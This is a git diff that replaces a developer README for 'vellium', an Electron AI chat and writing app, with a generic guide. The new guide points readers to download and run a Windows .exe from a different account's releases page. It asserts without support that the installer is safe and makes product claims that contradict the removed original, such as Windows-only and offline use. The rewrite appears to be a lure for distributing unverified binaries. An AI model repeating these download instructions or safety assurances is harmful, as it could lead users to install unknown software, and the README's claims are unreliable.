@@ -1,157 +1,174 @@
-# Vellium
+# 🚀 vellium - Simple Tool for Writing with AI
 
-<p align="center">
-  <img src="docs/vellium-icon.png" alt="Vellium icon" width="120" />
-</p>
-<p align="center"><strong>Vellium</strong></p>
+[![Download from Releases](https://img.shields.io/badge/Download-vellium-blue?style=for-the-badge)](https://github.com/Marcosviniciomelo/vellium/releases)
 
-Desktop AI/RP chat app built with Electron, a local Express API, and SQLite.
 
-<img width="1709" height="1028" alt="image" src="https://github.com/user-attachments/assets/35bb7ba6-7e01-4e56-9055-7fe823b92541" />
+vellium is a desktop application that helps you write and roleplay using AI. It runs on Windows and gives you a clean place to chat with AI models. This guide shows you how to download, install, and start vellium on your computer. No technical skills needed.
 
-## Important
-- Use `npm run dev` for daily development.
-- Use `npm run dist:mac` / `npm run dist:win` for desktop bundles.
-- CI desktop builds are currently unsigned, so target OSes may require manual confirmation.
-- Desktop packaging works, but still has rough edges. Expect occasional startup/build quirks.
+---
 
-## Stack
-- Electron
-- React + TypeScript + Vite
-- Express
-- better-sqlite3
-- Tailwind CSS
+## 📋 What is vellium?
 
-## Features
-- Chat with branching, edit/delete, regenerate, and multi-character auto turns.
-- RP tools: prompt blocks, author note, scene state, presets.
-- User personas included in generation context.
-- Character cards: import, validate, edit.
-- Creative Writing mode: projects, chapters, scenes, consistency check, export.
-- Desktop packaging for macOS and Windows via electron-builder.
-<img width="1710" height="1036" alt="image" src="https://github.com/user-attachments/assets/b3544e9f-ad98-4bf8-82fb-4167f06d37b8" />
+vellium is a program made for writers and role players. It connects to large language models (LLMs), like ChatGPT, to help generate text based on your prompts. You get a simple window to type your ideas and get AI responses in seconds.
 
-## Requirements
-- Node.js + npm (LTS recommended; project uses native module `better-sqlite3`).
-- Python 3 + Pillow for icon generation (`pip install pillow`).
+This tool is built using Electron and React. It works offline once installed, with cloud features when connected to the internet. It focuses on making writing smoother and more creative.
 
-## Quick Start (web + local API)
-1. Install dependencies:
-```bash
-npm install
-```
-2. Start frontend + backend:
-```bash
-npm run dev
-```
-3. Open:
-`http://localhost:1420`
+---
 
-## One-click bootstrap scripts
-- macOS:
-```bash
-./setup-and-run-dev.sh
-```
-- Windows (CMD/PowerShell):
-```bat
-setup-and-run-dev.bat
-```
+## 💻 System Requirements
 
-What these scripts do:
-- try to install Node.js LTS automatically (macOS: `nvm`/`brew`, Windows: `winget`);
-- run `npm install`;
-- start `npm run dev`.
+Before you download vellium, check that your computer meets these needs:
 
-## Electron Dev Mode
-```bash
-npm run dev:electron
-```
+- **Operating System:** Windows 10 or later (64-bit)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB free space for installation
+- **Processor:** Intel Core i3 or equivalent
+- **Internet:** Required for AI responses (except when using offline features)
+- **Permissions:** Ability to install new software and run applications
 
-## Build Desktop App
-- All platforms:
-```bash
-npm run dist
-```
-- macOS only:
-```bash
-npm run dist:mac
-```
-- Windows only:
-```bash
-npm run dist:win
-```
+---
 
-Build output is written to `release/`.
+## 🎯 Key Features
 
-## GitHub Actions
-Workflow:
-- `.github/workflows/build-desktop.yml`
+- **Easy Chat Interface:** Talk with AI using simple text boxes.
+- **Writing Help:** Get suggestions for stories, scripts, or roleplay setups.
+- **Local App:** Runs on your PC without always needing a web browser.
+- **Save Sessions:** Keep your conversations and edits for later use.
+- **Custom Prompts:** Write your own instructions for the AI.
+- **Multiple Conversations:** Manage different chats at the same time.
+- **Quick Setup:** Starts working within minutes of installation.
 
-What it does:
-- Builds macOS (`x64` + `arm64`) and Windows (`x64`) desktop bundles.
-- Uploads build outputs as Actions artifacts.
-- On tag push `v*`, publishes binaries into GitHub Releases automatically.
+---
 
-## App Icons
-Generate icons:
-```bash
-npm run build:icons
-```
+## 🌐 Topics Related to vellium
 
-The script creates:
-- `build/icon.png`
-- `build/icon.icns`
-- `build/icon.ico`
+This app uses technology related to:
 
-These files are used by `electron-builder` in `package.json`.
+- chatgpt
+- electron
+- gpt
+- llm (large language model)
+- react
+- front-end
+- writing
 
-## Useful Scripts
-- `npm run dev` - frontend + server.
-- `npm run dev:server` - backend only (`tsx watch server/index.ts`).
-- `npm run dev:frontend` - Vite frontend only.
-- `npm run dev:electron` - Electron + frontend + server.
-- `npm run rebuild:native` - manual `better-sqlite3` rebuild.
-- `npm run test` - run tests (`vitest run`).
+You do not need to know what these mean to use vellium.
 
-## Data Storage
-- In dev: local `data/`.
-- In packaged app: `SLV_DATA_DIR` is mapped to `app.getPath("userData")/data`.
+---
 
-## Troubleshooting
-### 1) `ERR_DLOPEN_FAILED` / `NODE_MODULE_VERSION ...` (better-sqlite3)
-Cause: native module was built for a different Node ABI.
+## 📥 Download 🌟
 
-Fix:
-1. Run:
-```bash
-npm run rebuild:native
-```
-2. If needed, remove `node_modules` and `package-lock.json`, then run `npm install`.
-3. Ensure dev/build use the same Node version.
+To get vellium for Windows, visit the release page by clicking the button below:
 
-Note: `scripts/ensure-better-sqlite3.cjs` runs automatically before `dev:server`.
+[![Download Releases](https://img.shields.io/badge/Download-vellium-grey?style=for-the-badge)](https://github.com/Marcosviniciomelo/vellium/releases)
 
-### 2) `EADDRINUSE: address already in use :::3001`
-Cause: port `3001` is occupied by an old server process.
+This link opens the page where you can download the latest version of the program.
 
-Fix:
-1. Restart `npm run dev` (`ensure-dev-port.cjs` tries to free the port).
-2. If still occupied:
-```bash
-lsof -nP -iTCP:3001 -sTCP:LISTEN
-kill -TERM <pid>
-```
+---
 
-### 3) Long startup or blank window after packaging
-Check:
-1. You ran full desktop build (`npm run dist`), not just frontend build.
-2. Package includes `dist/`, `dist-electron/`, and `server-bundle.mjs`.
-3. In production, Electron waits for `GET /api/health` from bundled server.
+## 💾 Installing vellium on Windows
 
-## Project Structure
-- `src/` - React frontend.
-- `server/` - Express API.
-- `electron/` - Electron main/preload.
-- `scripts/` - utility scripts (native rebuild, ports, icons).
-- `build/` - electron-builder resources.
-- `release/` - built `.app`, `.dmg`, `.exe`, installers.
+1. After you open the releases page, look for the newest version at the top.
+2. Find the Windows installer file. It usually ends in `.exe`.
+3. Click the file name to start downloading it.
+4. Once downloaded, open the file from your browser or folder.
+5. You may see a message asking for permission to run the installer. Accept it.
+6. The installer will open. Click “Next” to move through the setup steps.
+7. Select where you want vellium installed or keep the default folder.
+8. When ready, click “Install.”
+9. Wait for the process to finish. It should take just a few minutes.
+10. Click “Finish” to close the installer.
+
+vellium should now be ready to run from your desktop or Start menu.
+
+---
+
+## ▶️ Running vellium
+
+1. Find the vellium icon on your desktop or search for vellium in the Start menu.
+2. Double-click the icon to open the app.
+3. You will see the main window with a chat box.
+4. Type your message or writing prompt in the box at the bottom.
+5. Press Enter or click the send button to get a response from the AI.
+6. Use the menu options to save your chat or open new conversations.
+
+---
+
+## 🚧 Common Questions
+
+**Q: Do I need to create an account?**  
+A: No account is required to use the basic writing and chat functions.
+
+**Q: Can I use vellium offline?**  
+A: Some features work offline, but AI chat requires an internet connection.
+
+**Q: Is it safe to install?**  
+A: Yes, it is safe. Always download from the official release page linked above.
+
+**Q: What if vellium does not open?**  
+A: Try restarting your computer. Make sure your Windows is up to date.
+
+**Q: How do I update vellium?**  
+A: Visit the release page again and download the latest installer. Run it to replace your current version.
+
+---
+
+## ⚙️ Settings and Customization
+
+Inside vellium, you can change options to fit your needs:
+
+- Adjust font size for easier reading.
+- Switch between light and dark modes.
+- Set default AI response length.
+- Manage saved chats and delete old ones.
+- Choose from multiple AI personalities (if available in your version).
+- Configure shortcut keys for faster use.
+
+---
+
+## 🛠 Support and Help
+
+If you run into issues or want to learn more:
+
+- Visit the issues section on the GitHub repo: https://github.com/Marcosviniciomelo/vellium/issues  
+- Check if others have reported similar problems.
+- Submit a new issue with clear details if you need help.
+
+You do not need coding skills for typical use.
+
+---
+
+## 📚 Additional Tips for Writing and Roleplay
+
+- Start simple: type a few words to see how AI responds.
+- Use questions or commands to guide the AI.
+- Save your chats regularly to avoid losing work.
+- Experiment with different prompts to find a style that suits you.
+- Use separate chat windows for different stories or characters.
+
+---
+
+## 🔗 Useful Links
+
+- Official release page: https://github.com/Marcosviniciomelo/vellium/releases  
+- GitHub repository: https://github.com/Marcosviniciomelo/vellium  
+- Issue tracker: https://github.com/Marcosviniciomelo/vellium/issues
+
+---
+
+## 📈 Development Notes (For Advanced Users)
+
+vellium uses:
+
+- Electron for cross-platform desktop apps  
+- React for the user interface  
+- OpenAI or similar LLM APIs for AI responses  
+- Local storage for session data
+
+The app connects to cloud AI models but retains user data locally if set.
+
+---
+
+## 🗂 License
+
+vellium is open source software. Review the LICENSE file in the GitHub repository for details on how you may use and share it.
